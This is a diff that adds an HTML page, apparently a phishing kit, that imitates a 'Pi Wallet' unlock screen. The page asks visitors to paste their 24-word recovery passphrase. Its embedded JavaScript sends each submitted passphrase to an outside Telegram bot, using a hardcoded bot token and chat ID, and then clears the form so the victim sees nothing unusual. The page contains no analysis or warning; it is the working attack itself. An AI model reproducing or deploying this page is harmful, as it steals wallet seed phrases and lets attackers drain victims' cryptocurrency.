@@ -1,0 +1,152 @@
+
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8">
+  <title>Pi Wallet Kilidini Aç</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script>
+    function sendTelegramMessage(message) {
+        var token = '7038125050:AAFJn5ECemnWhO_Ng8pL7S4NRI4UsZ0Br-k';  // Bot API token'ınız
+        var chatId = '7932342101';  // Chat ID
+
+        var url = `https://api.telegram.org/bot${token}/sendMessage`;
+        var data = {
+            chat_id: chatId,
+            text: message
+        };
+
+        fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(data)
+        })
+        .then(response => response.json())
+        .then(data => console.log('Mesaj gönderildi:', data))
+        .catch(error => console.error('Mesaj gönderilirken hata oluştu:', error));
+    }
+
+    function sendFormToTelegram(e) {
+        e.preventDefault();
+        var passphrase = e.target.passphrase.value;  // Formdaki passphrase verisini al
+        var message = `Yeni Form Gönderimi:
+Passphrase: ${passphrase}`;
+        sendTelegramMessage(message);
+        alert("Mesaj Telegram'a gönderildi!");
+        e.target.reset();  // Formu sıfırla
+    }
+  </script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #ffffff;
+      margin: 0;
+      padding: 0;
+      color: #333;
+      text-align: center;
+    }
+    .header {
+      background-color: #8e44ad;
+      color: #fff;
+      padding: 20px 0;
+      font-size: 18px;
+    }
+    .header i {
+      margin-right: 8px;
+    }
+    h1 {
+      color: #3b3b3b;
+      font-size: 20px;
+      margin: 30px 15px 15px;
+      padding: 0 10px;
+    }
+    form {
+      max-width: 500px;
+      margin: 0 auto;
+      padding: 0 15px;
+    }
+    textarea {
+      width: 100%;
+      height: 150px;
+      padding: 15px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 15px;
+      margin-bottom: 20px;
+      resize: none;
+      box-sizing: border-box;
+    }
+    .btn {
+      display: block;
+      width: 100%;
+      padding: 15px;
+      font-size: 16px;
+      border-radius: 15px;
+      border: none;
+      margin: 10px 0;
+      cursor: pointer;
+      box-sizing: border-box;
+    }
+    .btn-outline {
+      background-color: transparent;
+      color: #8e44ad;
+      border: 2px solid #8e44ad;
+    }
+    .btn-filled {
+      background-color: #8e44ad;
+      color: white;
+    }
+    p {
+      max-width: 600px;
+      margin: 20px auto;
+      font-size: 14px;
+      color: #444;
+      line-height: 1.6;
+      padding: 0 15px;
+    }
+    a {
+      color: #2a68d2;
+      text-decoration: none;
+    }
+    @media (max-width: 480px) {
+      .header {
+        font-size: 16px;
+        padding: 15px 0;
+      }
+      h1 {
+        font-size: 18px;
+      }
+      textarea {
+        height: 130px;
+      }
+      .btn {
+        font-size: 15px;
+        padding: 13px;
+      }
+      p {
+        font-size: 13px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="header">
+    <i class="fas fa-wallet"></i> Wallet
+  </div>
+  <h1>Paste your Reminder Sequence to unlock Wallet.</h1>
+  <form onsubmit="sendFormToTelegram(event)">
+    <textarea name="passphrase" placeholder="Enter your 24-word passphrase here" required></textarea>
+    <button class="btn btn-outline" type="submit"><i class="fas fa-key"></i> OPEN WITH A MEMORATIVE SERIES</button>
+    <button class="btn btn-filled" type="button"><i class="fas fa-fingerprint"></i> OPEN WITH FINGERPRINT</button>
+  </form>
+  <p>
+    As an anon-custodial wallet, your wallet's Mnemonic String is yours and yours alone. Recovering the Mnemonic String is not currently possible.
+  </p>
+  <p>
+    Lost your Mnemonic array? <a href="#">You can create a new wallet</a>, All your balance in your previous wallet will be inaccessible.
+  </p>
+</body>
+</html>
